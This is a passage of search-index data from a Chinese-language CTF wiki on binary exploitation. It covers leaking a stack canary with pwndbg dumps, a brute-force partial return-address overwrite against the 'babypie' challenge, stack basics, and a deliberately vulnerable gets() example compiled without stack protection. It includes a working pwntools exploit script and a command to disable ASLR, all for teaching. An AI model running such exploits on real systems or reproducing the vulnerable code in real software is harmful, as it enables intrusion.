\u4f4e\u4f4d\u4e3a\u975e 0 \u503c\u65f6, canary \u5c31\u53ef\u4ee5\u88ab printf \u6253\u5370\u51fa\u6765\u4e86) Breakpoint 1 , 0x0000557c8443aa08 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x0 RBX 0x0 RCX 0x7f1898a64690 ( __read_nocancel + 7 ) \u25c2\u2014 cmp rax , - 0xfff RDX 0x30 RDI 0x557c8443ab15 \u25c2\u2014 insb byte ptr [ rdi ], dx / * ' Hello %s : \\ n ' * / RSI 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) R8 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R9 0x7f1898f1d700 \u25c2\u2014 0x7f1898f1d700 R10 0x37b R11 0x246 R12 0x557c8443a830 \u25c2\u2014 xor ebp , ebp R13 0x7ffd97aa0540 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 RSP 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) RIP 0x557c8443aa08 \u25c2\u2014 call 0x557c8443a7e0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0 x557c8443aa08 call 0x557c8443a7e0 0 x557c8443aa0d lea rax , [ rbp - 0x30 ] 0 x557c8443aa11 mov edx , 0x60 0 x557c8443aa16 mov rsi , rax 0 x557c8443aa19 mov edi , 0 0 x557c8443aa1e call 0x557c8443a7f0 0 x557c8443aa23 mov eax , 0 0 x557c8443aa28 mov rcx , qword ptr [ rbp - 8 ] 0 x557c8443aa2c xor rcx , qword ptr fs :[ 0x28 ] 0 x557c8443aa35 je 0x557c8443aa3c 0 x557c8443aa37 call 0x557c8443a7c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rsi rsp 0x7ffd97aa0410 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) ... \u2193 05:0028\u2502 0 x7ffd97aa0438 \u25c2\u2014 0xb3012605fc402a61 06:0030\u2502 rbp 0x7ffd97aa0440 \u2014\u25b8 0x7ffd97aa0460 \u2014\u25b8 0x557c8443aa80 \u25c2\u2014 push r15 07:0038\u2502 0 x7ffd97aa0448 \u2014\u25b8 0x557c8443aa6a \u25c2\u2014 mov eax , 0 Breakpoint *( 0x557c8443a000 + 0xA08 ) pwndbg > canary $1 = 0 canary : 0xb3012605fc402a00 pwndbg > canary \u5728 rbp - 0x8 \u7684\u4f4d\u7f6e\u4e0a, \u53ef\u4ee5\u770b\u51fa\u6b64\u65f6 canary \u7684\u4f4e\u4f4d\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a 0x61, \u8fd9\u6837\u53ea\u8981\u63a5\u6536 'a' * (0x30 - 0x8 + 1) \u540e\u7684 7 \u4f4d, \u518d\u52a0\u4e0a\u6700\u4f4e\u4f4d\u7684 '\\0', \u6211\u4eec\u5c31\u6062\u590d\u51fa\u7a0b\u5e8f\u7684 canary \u4e86","title":"leak canary"},{"location":"pwn/stackoverflow/others/#_20","text":"\u6709\u4e86 canary \u540e, \u5c31\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e8c\u6b21\u7684\u6808\u6ea2\u51fa\u6765\u6539\u5199\u8fd4\u56de\u5730\u5740\u4e86, \u63a7\u5236\u8fd4\u56de\u5730\u5740\u5230 getshell \u51fd\u6570\u5373\u53ef, \u6211\u4eec\u5148\u770b\u4e00\u4e0b\u6ca1\u6ea2\u51fa\u65f6\u7684\u8fd4\u56de\u5730\u5740 0 x000055dc43694a1e in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) RBX 0x0 RCX 0x7f206c6696f0 ( __write_nocancel + 7 ) \u25c2\u2014 cmp rax , - 0xfff RDX 0x60 RDI 0x0 RSI 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) R8 0x7f206cb22700 \u25c2\u2014 0x7f206cb22700 R9 0x3e R10 0x73 R11 0x246 R12 0x55dc43694830 \u25c2\u2014 xor ebp , ebp R13 0x7fff9aa3b050 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 RSP 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) RIP 0x55dc43694a1e \u25c2\u2014 call 0x55dc436947f0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 0 x55dc43694a08 call 0x55dc436947e0 0 x55dc43694a0d lea rax , [ rbp - 0x30 ] 0 x55dc43694a11 mov edx , 0x60 0 x55dc43694a16 mov rsi , rax 0 x55dc43694a19 mov edi , 0 \u25ba 0 x55dc43694a1e call 0x55dc436947f0 0 x55dc43694a23 mov eax , 0 0 x55dc43694a28 mov rcx , qword ptr [ rbp - 8 ] 0 x55dc43694a2c xor rcx , qword ptr fs :[ 0x28 ] 0 x55dc43694a35 je 0x55dc43694a3c 0 x55dc43694a37 call 0x55dc436947c0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 rax rsi rsp 0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ( ' aaaaaaaa ' ) ... \u2193 05:0028\u2502 0 x7fff9aa3af48 \u25c2\u2014 0xbfe0cfbabccd2861 06:0030\u2502 rbp 0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push r15 07:0038\u2502 0 x7fff9aa3af58 \u2014\u25b8 0x55dc43694a6a \u25c2\u2014 mov eax , 0 pwndbg > x / 10 i ( 0x0A3E + 0x55dc43694000 ) 0x55dc43694a3e : push rbp 0 x55dc43694a3f: mov rbp , rsp 0 x55dc43694a42: lea rdi ,[ rip + 0xd7 ] # 0x55dc43694b20 0x55dc43694a49 : call 0x55dc436947d0 0 x55dc43694a4e: nop 0 x55dc43694a4f: pop rbp 0 x55dc43694a50: ret 0x55dc43694a51 : push rbp 0 x55dc43694a52: mov rbp , rsp 0 x55dc43694a55: sub rsp , 0x10 \u53ef\u4ee5\u53d1\u73b0, \u6b64\u65f6\u7684\u8fd4\u56de\u5730\u5740\u4e0e get shell \u51fd\u6570\u7684\u5730\u5740\u53ea\u6709\u4f4e\u4f4d\u7684 16 bit \u4e0d\u540c, \u5982\u679c\u8986\u5199\u4f4e 16 bit \u4e3a 0x?A3E, \u5c31\u6709\u4e00\u5b9a\u7684\u51e0\u7387 get shell \u6700\u7ec8\u7684\u811a\u672c\u5982\u4e0b: #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # context.log_level = \"debug\" context . terminal = [ \"deepin-terminal\" , \"-x\" , \"sh\" , \"-c\" ] while True : try : io = process ( \"./babypie\" , timeout = 1 ) # gdb.attach(io) io . sendafter ( \": \\n \" , 'a' * ( 0x30 - 0x8 + 1 )) io . recvuntil ( 'a' * ( 0x30 - 0x8 + 1 )) canary = ' \\0 ' + io . recvn ( 7 ) success ( canary . encode ( 'hex' )) # gdb.attach(io) io . sendafter ( \": \\n \" , 'a' * ( 0x30 - 0x8 ) + canary + 'bbbbbbbb' + ' \\x3E\\x0A ' ) io . interactive () except Exception as e : io . close () print e \u9700\u8981\u6ce8\u610f\u7684\u662f, \u8fd9\u79cd\u6280\u5de7\u4e0d\u6b62\u5728\u6808\u4e0a\u6709\u6548, \u5728\u5806\u4e0a\u4e5f\u662f\u4e00\u79cd\u6709\u6548\u7684\u7ed5\u8fc7\u5730\u5740\u968f\u673a\u5316\u7684\u624b\u6bb5","title":"\u8986\u76d6\u8fd4\u56de\u5730\u5740"},{"location":"pwn/stackoverflow/others/#_21","text":"","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/stack_intro/","text":"\u6808\u4ecb\u7ecd \u00b6 \u57fa\u672c\u6808\u4ecb\u7ecd \u00b6 \u6808\u662f\u4e00\u79cd\u5178\u578b\u7684\u5148\u8fdb\u540e\u51fa( First in Last Out )\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u64cd\u4f5c\u4e3b\u8981\u6709\u538b\u6808(push)\u4e0e\u51fa\u6808(pop)\u4e24\u79cd\u64cd\u4f5c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u7ef4\u57fa\u767e\u79d1\uff09\u3002\u4e24\u79cd\u64cd\u4f5c\u90fd\u64cd\u4f5c\u6808\u9876\uff0c\u5f53\u7136\uff0c\u5b83\u4e5f\u6709\u6808\u5e95\u3002 \u9ad8\u7ea7\u8bed\u8a00\u5728\u8fd0\u884c\u65f6\u90fd\u4f1a\u88ab\u8f6c\u6362\u4e3a\u6c47\u7f16\u7a0b\u5e8f\uff0c\u5728\u6c47\u7f16\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5145\u5206\u5229\u7528\u4e86\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u90fd\u6709\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d\u67d0\u4e00\u90e8\u5206\u5c31\u662f\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7684\u6808\uff0c\u7528\u4e8e\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u4fe1\u606f\u548c\u5c40\u90e8\u53d8\u91cf\u3002\u6b64\u5916\uff0c\u5e38\u89c1\u7684\u64cd\u4f5c\u4e5f\u662f\u538b\u6808\u4e0e\u51fa\u6808\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7a0b\u5e8f\u7684\u6808\u662f\u4ece\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684 \u3002 \u51fd\u6570\u8c03\u7528\u6808 \u00b6 \u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u6587\u7ae0\u6765\u5b66\u4e60\u4e00\u4e0b\u57fa\u672c\u7684\u51fd\u6570\u8c03\u7528\u6808\u3002 C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00) C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c) \u8fd9\u91cc\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u5f20\u5bc4\u5b58\u5668\u7684\u56fe \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32 \u4f4d\u548c 64 \u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b x86 \u51fd\u6570\u53c2\u6570 \u5728 \u51fd\u6570\u8fd4\u56de\u5730\u5740 \u7684\u4e0a\u65b9 x64 System V AMD64 ABI (Linux\u3001FreeBSD\u3001macOS \u7b49\u91c7\u7528)\u4e2d\u524d\u516d\u4e2a\u6574\u578b\u6216\u6307\u9488\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728 RDI, RSI, RDX, RCX, R8 \u548c R9 \u5bc4\u5b58\u5668 \u4e2d\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002 \u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e 0x00007FFFFFFFFFFF\uff0c 6 \u4e2a\u5b57\u8282\u957f\u5ea6 \uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 \u53c2\u8003\u9605\u8bfb \u00b6 csapp Calling conventions for different C++ compilers and operating systems, Agner Fog","title":"\u6808\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/stack_intro/#_1","text":"","title":"\u6808\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/stack_intro/#_2","text":"\u6808\u662f\u4e00\u79cd\u5178\u578b\u7684\u5148\u8fdb\u540e\u51fa( First in Last Out )\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u64cd\u4f5c\u4e3b\u8981\u6709\u538b\u6808(push)\u4e0e\u51fa\u6808(pop)\u4e24\u79cd\u64cd\u4f5c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff08\u7ef4\u57fa\u767e\u79d1\uff09\u3002\u4e24\u79cd\u64cd\u4f5c\u90fd\u64cd\u4f5c\u6808\u9876\uff0c\u5f53\u7136\uff0c\u5b83\u4e5f\u6709\u6808\u5e95\u3002 \u9ad8\u7ea7\u8bed\u8a00\u5728\u8fd0\u884c\u65f6\u90fd\u4f1a\u88ab\u8f6c\u6362\u4e3a\u6c47\u7f16\u7a0b\u5e8f\uff0c\u5728\u6c47\u7f16\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5145\u5206\u5229\u7528\u4e86\u8fd9\u4e00\u6570\u636e\u7ed3\u6784\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u90fd\u6709\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d\u67d0\u4e00\u90e8\u5206\u5c31\u662f\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7684\u6808\uff0c\u7528\u4e8e\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u4fe1\u606f\u548c\u5c40\u90e8\u53d8\u91cf\u3002\u6b64\u5916\uff0c\u5e38\u89c1\u7684\u64cd\u4f5c\u4e5f\u662f\u538b\u6808\u4e0e\u51fa\u6808\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7a0b\u5e8f\u7684\u6808\u662f\u4ece\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\u7684 \u3002","title":"\u57fa\u672c\u6808\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/stack_intro/#_3","text":"\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u6587\u7ae0\u6765\u5b66\u4e60\u4e00\u4e0b\u57fa\u672c\u7684\u51fd\u6570\u8c03\u7528\u6808\u3002 C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e00) C\u8bed\u8a00\u51fd\u6570\u8c03\u7528\u6808(\u4e8c) \u8fd9\u91cc\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u5f20\u5bc4\u5b58\u5668\u7684\u56fe \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32 \u4f4d\u548c 64 \u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b x86 \u51fd\u6570\u53c2\u6570 \u5728 \u51fd\u6570\u8fd4\u56de\u5730\u5740 \u7684\u4e0a\u65b9 x64 System V AMD64 ABI (Linux\u3001FreeBSD\u3001macOS \u7b49\u91c7\u7528)\u4e2d\u524d\u516d\u4e2a\u6574\u578b\u6216\u6307\u9488\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728 RDI, RSI, RDX, RCX, R8 \u548c R9 \u5bc4\u5b58\u5668 \u4e2d\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002 \u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e 0x00007FFFFFFFFFFF\uff0c 6 \u4e2a\u5b57\u8282\u957f\u5ea6 \uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002","title":"\u51fd\u6570\u8c03\u7528\u6808"},{"location":"pwn/stackoverflow/stack_intro/#_4","text":"csapp Calling conventions for different C++ compilers and operating systems, Agner Fog","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"pwn/stackoverflow/stackoverflow_basic/","text":"\u6808\u6ea2\u51fa\u539f\u7406 \u00b6 \u4ecb\u7ecd \u00b6 \u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u4e0e\u5176\u76f8\u90bb\u7684\u6808\u4e2d\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\uff0c\u7c7b\u4f3c\u7684\u8fd8\u6709\u5806\u6ea2\u51fa\uff0cbss \u6bb5\u6ea2\u51fa\u7b49\u6ea2\u51fa\u65b9\u5f0f\u3002\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f \u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002 \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002 \u57fa\u672c\u793a\u4f8b \u00b6 \u6700\u5178\u578b\u7684\u6808\u6ea2\u51fa\u5229\u7528\u662f\u8986\u76d6\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u5730\u5740\uff0c \u5f53\u7136\u9700\u8981\u786e\u4fdd\u8fd9\u4e2a\u5730\u5740\u6240\u5728\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650 \u3002\u4e0b\u9762\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a #include <stdio.h> #include <string.h> void success () { puts ( \"You Hava already controlled it.\" ); } void vulnerable () { char s [ 12 ]; gets ( s ); puts ( s ); return ; } int main ( int argc , char ** argv ) { vulnerable (); return 0 ; } \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002 \u6211\u4eec\u5e0c\u671b\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c success \u51fd\u6570\u3002 \u6211\u4eec\u5229\u7528\u5982\u4e0b\u547d\u4ee4\u5bf9\u5176\u8fdb\u884c\u7f16\u8bd1 \u279c stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example stack_example.c: In function \u2018vulnerable\u2019: stack_example.c:6:3: warning: implicit declaration of function \u2018gets\u2019 [ -Wimplicit-function-declaration ] gets ( s ) ; ^ /tmp/ccPU8rRA.o\uff1a\u5728\u51fd\u6570\u2018vulnerable\u2019\u4e2d\uff1a stack_example.c: ( .text+0x27 ) : \u8b66\u544a\uff1a the ` gets ' function is dangerous and should not be used. \u53ef\u4ee5\u770b\u51fa gets \u672c\u8eab\u662f\u4e00\u4e2a\u5371\u9669\u51fd\u6570\u3002\u5b83\u4ece\u4e0d\u68c0\u67e5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u800c\u662f\u4ee5\u56de\u8f66\u6765\u5224\u65ad\u8f93\u5165\u662f\u5426\u7ed3\u675f\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53ef\u4ee5\u5bfc\u81f4\u6808\u6ea2\u51fa\uff0c \u5386\u53f2\u4e0a\uff0c \u83ab\u91cc\u65af\u8815\u866b \u7b2c\u4e00\u79cd\u8815\u866b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86 gets \u8fd9\u4e2a\u5371\u9669\u51fd\u6570\u5b9e\u73b0\u4e86\u6808\u6ea2\u51fa\u3002 gcc \u7f16\u8bd1\u6307\u4ee4\u4e2d\uff0c -m32 \u6307\u7684\u662f\u751f\u6210 32 \u4f4d\u7a0b\u5e8f\uff1b -fno-stack-protector \u6307\u7684\u662f\u4e0d\u5f00\u542f\u5806\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5373\u4e0d\u751f\u6210 canary\u3002 \u6b64\u5916\uff0c\u4e3a\u4e86\u66f4\u52a0\u65b9\u4fbf\u5730\u4ecb\u7ecd\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u5229\u7528\u65b9\u5f0f\uff0c\u8fd9\u91cc\u8fd8\u9700\u8981\u5173\u95ed PIE\uff08Position Independent Executable\uff09\uff0c\u907f\u514d\u52a0\u8f7d\u57fa\u5740\u88ab\u6253\u4e71\u3002\u4e0d\u540c gcc \u7248\u672c\u5bf9\u4e8e PIE \u7684\u9ed8\u8ba4\u914d\u7f6e\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 gcc -v \u67e5\u770bgcc \u9ed8\u8ba4\u7684\u5f00\u5173\u60c5\u51b5\u3002\u5982\u679c\u542b\u6709 --enable-default-pie \u53c2\u6570\u5219\u4ee3\u8868 PIE \u9ed8\u8ba4\u5df2\u5f00\u542f\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u6307\u4ee4\u4e2d\u6dfb\u52a0\u53c2\u6570 -no-pie \u3002 \u7f16\u8bd1\u6210\u529f\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 checksec \u5de5\u5177\u68c0\u67e5\u7f16\u8bd1\u51fa\u7684\u6587\u4ef6\uff1a \u279c stack-example checksec stack_example Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u63d0\u5230\u7f16\u8bd1\u65f6\u7684 PIE \u4fdd\u62a4\uff0cLinux\u5e73\u53f0\u4e0b\u8fd8\u6709\u5730\u5740\u7a7a\u95f4\u5206\u5e03\u968f\u673a\u5316\uff08ASLR\uff09\u7684\u673a\u5236\u3002\u7b80\u5355\u6765\u8bf4\u5373\u4f7f\u53ef\u6267\u884c\u6587\u4ef6\u5f00\u542f\u4e86 PIE \u4fdd\u62a4\uff0c\u8fd8\u9700\u8981\u7cfb\u7edf\u5f00\u542f ASLR \u624d\u4f1a\u771f\u6b63\u6253\u4e71\u57fa\u5740\uff0c\u5426\u5219\u7a0b\u5e8f\u8fd0\u884c\u65f6\u4f9d\u65e7\u4f1a\u5728\u52a0\u8f7d\u4e00\u4e2a\u56fa\u5b9a\u7684\u57fa\u5740\u4e0a\uff08\u4e0d\u8fc7\u548c No PIE \u65f6\u57fa\u5740\u4e0d\u540c\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 /proc/sys/kernel/randomize_va_space \u6765\u63a7\u5236 ASLR \u542f\u52a8\u4e0e\u5426\uff0c\u5177\u4f53\u7684\u9009\u9879\u6709 0\uff0c\u5173\u95ed ASLR\uff0c\u6ca1\u6709\u968f\u673a\u5316\u3002\u6808\u3001\u5806\u3001.so \u7684\u57fa\u5730\u5740\u6bcf\u6b21\u90fd\u76f8\u540c\u3002 1\uff0c\u666e\u901a\u7684 ASLR\u3002\u6808\u57fa\u5730\u5740\u3001mmap\u57fa\u5730\u5740\u3001.so\u52a0\u8f7d\u57fa\u5730\u5740\u90fd\u5c06\u88ab\u968f\u673a\u5316\uff0c\u4f46\u662f\u5806\u57fa\u5730\u5740\u6ca1\u6709\u968f\u673a\u5316\u3002 2\uff0c\u589e\u5f3a\u7684ASLR\uff0c\u5728 1 \u7684\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e86\u5806\u57fa\u5730\u5740\u968f\u673a\u5316\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 echo 0 > /proc/sys/kernel/randomize_va_space \u5173\u95ed Linux \u7cfb\u7edf\u7684 ASLR\uff0c\u7c7b\u4f3c\u7684\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u76f8\u5e94\u7684\u53c2\u6570\u3002 